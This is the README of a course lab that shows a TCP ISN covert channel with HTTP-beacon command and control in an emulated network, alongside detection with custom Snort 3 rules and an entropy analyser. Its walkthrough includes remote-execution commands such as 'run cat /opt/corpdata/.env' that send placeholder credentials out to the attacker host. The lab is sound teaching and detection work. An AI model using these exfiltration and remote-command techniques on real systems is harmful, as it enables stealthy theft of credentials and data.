# TCP ISN Covert Channel with Reverse Shell and Network-Based Detection

## Network topology

```
[attacker 10.0.0.10] ── net_ext (10.0.0.0/24) ── [router 10.0.0.1/10.0.1.1] ── net_int (10.0.1.0/24) ── [victim 10.0.1.20]
                                                             │
                                                         [monitor]  (passive — eth0: net_ext, eth1: net_int)
```

| Device   | Interface | IP Address   | Network            |
|----------|-----------|--------------|--------------------| 
| attacker | eth0      | 10.0.0.10/24 | External (net_ext) |
| router   | eth0      | 10.0.0.1/24  | External (net_ext) |
| router   | eth1      | 10.0.1.1/24  | Internal (net_int) |
| victim   | eth0      | 10.0.1.20/24 | Internal (net_int) |
| monitor  | eth0      | —            | External (net_ext) |
| monitor  | eth1      | —            | Internal (net_int) |

The monitor is passive (no IP assigned). It captures all traffic on the internal segment.

## Objective

Demonstrate a post-compromise scenario where a victim exfiltrates corporate data
to an external attacker using a covert channel built on the TCP Initial Sequence
Number (ISN) field. Commands are delivered via a periodic HTTP beacon.
A passive monitor detects the attack using two complementary methods:

- **Signature-based**: Snort 3 custom rules on SYN rate anomalies and HTTP beacon patterns
- **Anomaly-based**: Shannon entropy analysis of ISN values (Python)

This lab extends the IP.id covert channel example from Module 5: TCP/80 is used
instead of ICMP because ICMP outbound is blocked by the corporate egress firewall,
while TCP/80 is permitted.

**Scope**: post-compromise only. The initial delivery vector is out of scope.
The starting state assumes the Scapy exfiltration script is already deployed on the victim.

## Integrated technologies

| Technology | Module | Role |
|---|---|---|
| Kathará multi-zone topology | M3 | Network segmentation (external / internal / monitor) |
| Scapy — TCP ISN crafting + HTTP beacon | M4, M5 | Covert channel exfiltration + C2 command delivery |
| iptables stateful egress filtering | M7 | Corporate firewall: TCP/80 allowed, ICMP blocked |
| Snort 3 + Python entropy detector | M8, M4 | Signature-based and anomaly-based detection |

## Snort 3 custom rules (`monitor/etc/snort/rules/local.rules`)

| SID     | Action | Description |
|---------|--------|-------------|
| 1000001 | alert  | SYN-only packets to TCP/80 at high rate — ISN covert channel |
| 1000002 | alert  | Periodic HTTP GET to same external host — C2 beacon |
| 1000003 | alert  | ICMP from internal network — firewall misconfiguration check |

## Prerequisites: Snort 3 Docker image

The monitor node requires a custom Docker image with Snort 3.
It is available on Docker Hub and will be pulled automatically on first `lstart`:

    marcoscarpa04/snort3-kathara

If you prefer to build it locally (~20 min):

```bash
cd ~/progetto
docker build -t marcoscarpa04/snort3-kathara .
```

## Start the lab

```bash
cd lab/main
kathara lstart
```

Wait for all nodes to finish their startup scripts. When the monitor prints:

```
============================================
 Monitor ready. Snort3 available.
 Run Snort manually:
 snort -c /tmp/clean_snort.lua -R /tmp/clean.rules -i eth1 --daq-batch-size 1
============================================
```

the lab is ready to use.

> **Note:** At startup, `monitor.startup` automatically creates CRLF-clean copies
> of the Snort configuration at `/tmp/clean_snort.lua` and `/tmp/clean.rules`.
> All Snort commands below use these clean copies.

> **Note:** Use `kathara connect <node>` to open a shell inside a node.
> `kathara exec` may misinterpret flags like `-c` as internal arguments.

> **Note:** Before running any demo, start the C2 receiver on the attacker — it also
> acts as the HTTP server required for the beacon and for Demo 1:
>
> ```bash
> kathara connect attacker
> python3 /home/receiver.py
> ```

## Demo 1 — Verify egress filtering

Open a shell on the victim and verify the firewall rules are in place:

```bash
kathara connect victim
```

```bash
# Test 1 — ICMP outbound should be blocked
ping -c 3 10.0.0.10
# Expected: 100% packet loss
```

```bash
# Test 2 — TCP/80 outbound should be allowed
curl -s http://10.0.0.10/
# Expected: empty response (the server is running — no body is served at /)
# Quit: Ctrl + C
```

## Demo 2 — Covert channel exfiltration and C2

Open three separate terminals.

### Terminal 1 — attacker

```bash
kathara connect attacker
python3 /home/receiver.py
```

Expected output:
```
[*] Waiting for beacon from victim...
run <cmd>  - execute a command on the victim
exit       - quit
```

### Terminal 2 — victim

```bash
kathara connect victim
python3 /home/sender.py
```

Expected output:
```
[*] Waiting for commands from attacker...
```

### Terminal 1 — send commands

Type a command at the attacker prompt:

```
run whoami
```

Expected output on the attacker (~5 seconds):
```
[+] Received command: whoami
[*] Exfiltrating 5 bytes via covert channel...
root
```

To exfiltrate sensitive data from the victim:

```
run cat /opt/corpdata/.env
```

Expected output (~8 seconds for 81 bytes):
```
DB_HOST=10.0.1.5
DB_USER=admin
DB_PASS=Sup3rS3cr3t!
API_KEY=sk-prod-a1b2c3d4e5f6
```

All visible traffic is TCP/80 — indistinguishable from HTTP browsing at the packet level.

## Demo 3 — Snort 3 detection (signature-based)

While the attack is running, open a shell on the monitor and start Snort:

```bash
kathara connect monitor
snort -c /tmp/clean_snort.lua -R /tmp/clean.rules -i eth1 --daq-batch-size 1
```

Expected alerts (appear within seconds, even without an active exfiltration command):

```
[**] [1:1000001:1] "[COVERT] High-rate SYN-only to TCP/80 - possible ISN covert channel" [**]
[Priority: 0] {TCP} 10.0.1.20:XXXXX -> 10.0.0.10:80

[**] [1:1000002:1] "[C2] Periodic HTTP beacon to external host" [**]
[Priority: 0] {TCP} 10.0.1.20:XXXXX -> 10.0.0.10:80
```

**Key observation**: alerts fire even in idle — the victim's polling generates
SYN-only packets continuously. Active exfiltration increases the rate of
sid:1000001 alerts.

Stop Snort with `Ctrl+C` when done.

## Demo 4 — Shannon entropy detection (anomaly-based)

This demo is split into two scenarios to show the contrast between covert and
legitimate traffic.

### Demo 4a — Covert traffic: entropy flagged during active exfiltration

Make sure `sender.py` is running on the victim and `receiver.py` on the attacker.
On the **monitor**, reset the pcap capture:

```bash
# On monitor
pkill tcpdump
tcpdump -i eth1 -w /hosthome/covert_session.pcap 'port 80' &
```

On the **attacker**, trigger a data exfiltration:

```
run cat /opt/corpdata/.env
```

Wait for the exfiltration to complete (~8 seconds), then stop the capture and analyze:

```bash
# On monitor
pkill tcpdump
python3 /root/detector.py /hosthome/covert_session.pcap
```

Expected output:

```
================================================================================
  ISN Entropy Analysis — Covert Channel Detection
  Method: Shannon entropy on TCP SYN sequence numbers
================================================================================
  Threshold: 6.0 bits/byte  (normal ISN ~7.5+, covert ISN ~3.0-5.0)

  Source IP     Window  #ISN  Full H  High H  Low H   Status
  -----------------------------------------------------------
  10.0.1.20     0-29    30    3.9586  1.0000  4.9172  *** SUSPICIOUS ***
  10.0.1.20     15-44   30    4.7540  2.4055  5.2151  *** SUSPICIOUS ***
  -----------------------------------------------------------
  ALERT: flagged source(s): 10.0.1.20
```

**Key values**:
- `Full H` ≈ 3.9–5.6 — well below the 6.0 threshold, structured data in ISN field
- `High H` ≈ 0–2 — the magic marker `0xCAFE` is constant in the upper 16 bits of every covert SYN

### Demo 4b — Legitimate traffic: no ISN anomaly, no Snort alerts

Stop the covert channel on the victim (`Ctrl+C` on `sender.py`).

On the **monitor**, start a fresh capture:

```bash
# On monitor
tcpdump -i eth1 -w /hosthome/baseline.pcap 'port 80' &
```

Then on the **victim**, simulate normal HTTP browsing:

```bash
# On victim — generate legitimate TCP/80 traffic (no covert channel)
for i in $(seq 1 20); do curl -s http://10.0.0.10/ > /dev/null; sleep 0.5; done
```

Wait for the curl loop to finish, then stop the capture and analyze:

```bash
# On monitor
pkill tcpdump
python3 /root/detector.py /hosthome/baseline.pcap
```

Expected output:

```
================================================================================
  ISN Entropy Analysis — Covert Channel Detection
================================================================================
  Threshold: 6.0 bits/byte  (normal ISN ~7.5+, covert ISN ~3.0-5.0)

  Source IP     Window  #ISN  Full H  High H  Low H   Status
  -----------------------------------------------------------
  10.0.1.20     0-29    30    6.4484  5.5276  5.6025  normal
  10.0.1.20     15-44   30    6.4880  5.6610  5.6276  normal
  -----------------------------------------------------------
  OK: No anomalies detected.
```

At the same time, Snort produces **no alerts** — with `sender.py` stopped there
is no SYN-only flood (sid:1000001) and no periodic HTTP beacon (sid:1000002).

**Summary of the contrast**:

| | Covert traffic (Demo 4a) | Legitimate traffic (Demo 4b) |
|---|---|---|
| Full H | 3.9–5.6 → **SUSPICIOUS** | 6.4–6.5 → normal |
| High H | 0–2 (fixed 0xCAFE) | 5.5–5.7 (random) |
| Snort sid:1000001 | fires | silent |
| Snort sid:1000002 | fires | silent |

## Key takeaway

| Aspect | Signature-based (Snort) | Anomaly-based (Python) |
|---|---|---|
| What it detects | SYN rate anomaly + HTTP beacon rate | Non-random structure in ISN values |
| Fires in idle? | Yes — polling SYNs are enough | Yes — entropy is low regardless |
| Ref | M8 slides 11, 24–27 | M8 slide 12, M4 slide 50 |

The two methods are complementary: Snort detects the *presence* of the channel;
the entropy detector detects *data encoded* in the ISN field.

## Stop the lab

```bash
kathara lclean
```

## References

- RFC 6528 — Defending against Sequence Number Attacks
- Course Module M3 — Kathará network emulation
- Course Module M4 — Packet analysis with Scapy
- Course Module M5 — Covert channels (IP.id example)
- Course Module M7 — iptables stateful filtering
- Course Module M8 — Snort 3 IDS/IPS
